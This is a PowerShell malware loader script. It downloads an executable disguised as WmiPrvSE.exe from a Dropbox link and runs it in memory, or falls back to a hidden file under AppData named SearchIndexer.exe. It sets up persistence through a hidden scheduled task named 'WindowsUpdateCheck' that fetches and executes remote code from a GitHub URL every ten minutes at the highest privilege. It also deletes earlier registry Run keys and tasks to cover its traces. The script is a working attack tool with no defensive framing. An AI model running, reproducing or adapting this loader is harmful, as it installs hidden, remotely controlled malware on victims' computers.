# ==========================================
# FINAL HYBRID LOADER (RAM + DISK BACKUP)
# ==========================================

# --- CONFIGURATION ---
$PayloadUrl = 'https://www.dropbox.com/scl/fi/x6s38mn7hyakminmivyqz/WmiPrvSE.exe?rlkey=3dimz2btxhy6p1x27oh10ghxn&st=ydc48ph3&dl=1'
$GitHubUrl  = 'https://github.com/bibkbkbkibjb-dev/ss/raw/refs/heads/main/deploy%20invisible.ps1'
$TaskName   = "WindowsUpdateCheck"

# --- 1. CLEANUP (Removes old popups & traces) ---
try {
    # Remove registry keys causing white windows
    Remove-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SysDeploy" -ErrorAction SilentlyContinue
    Remove-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SysDeploy" -ErrorAction SilentlyContinue
    Remove-ItemProperty "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSystemInit" -ErrorAction SilentlyContinue
    Stop-Process -Name "mshta" -Force -ErrorAction SilentlyContinue
    Unregister-ScheduledTask -TaskName "MicrosoftWindowsUpdater" -Confirm:$false -ErrorAction SilentlyContinue
    Unregister-ScheduledTask -TaskName "SystemHealthCheck" -Confirm:$false -ErrorAction SilentlyContinue
} catch {}

# --- 2. EXECUTION FUNCTION (Smart Load) ---
function Run-Payload {
    Write-Host "Downloading Payload..." -F Gray
    try {
        $wc = New-Object System.Net.WebClient
        $bytes = $wc.DownloadData($PayloadUrl)
    } catch {
        Write-Host "⚠️ Download Failed (Check URL/Internet)" -F Red; return
    }

    # METHOD A: RAM (Fileless)
    try {
        Write-Host "   [1] Trying RAM Load..." -F Gray
        $assembly = [System.AppDomain]::CurrentDomain.Load($bytes)
        $entry = $assembly.EntryPoint
        if ($entry) {
            $entry.Invoke($null, $null)
            Write-Host "      ✅ Success (RAM Mode)" -F Green
            return
        }
    } catch {
        Write-Host "      ⚠️ RAM Failed (32-bit/64-bit mismatch). Switching to Disk..." -F Yellow
    }

    # METHOD B: DISK (Fallback)
    try {
        Write-Host "   [2] Trying Disk Load..." -F Gray
        # Save to a hidden system folder
        $hiddenPath = "$env:APPDATA\Microsoft\Windows\Templates\SearchIndexer.exe"
        [IO.File]::WriteAllBytes($hiddenPath, $bytes)
        Start-Process $hiddenPath -WindowStyle Hidden
        Write-Host "      ✅ Success (Disk Mode): $hiddenPath" -F Green
    } catch {
        Write-Host "      ❌ Disk Failed. (Check Permissions)" -F Red
    }
}

# --- 3. PERSISTENCE (The "Zombie" Task) ---
try {
    $exists = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
    if (-not $exists) {
        $cmd = "powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"iwr '$GitHubUrl' | iex`""
        
        $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"$cmd`""
        $Trigger1 = New-ScheduledTaskTrigger -AtLogon
        $Trigger2 = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 10)
        $Principal = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Users" -RunLevel Highest
        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
        
        Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger @($Trigger1, $Trigger2) -Principal $Principal -Settings $Settings -Force | Out-Null
        Write-Host "✅ Persistence Installed: $TaskName" -F Green
    }
} catch {
    Write-Host "⚠️ Persistence Failed" -F Red
}

# --- 4. START ---
Run-Payload
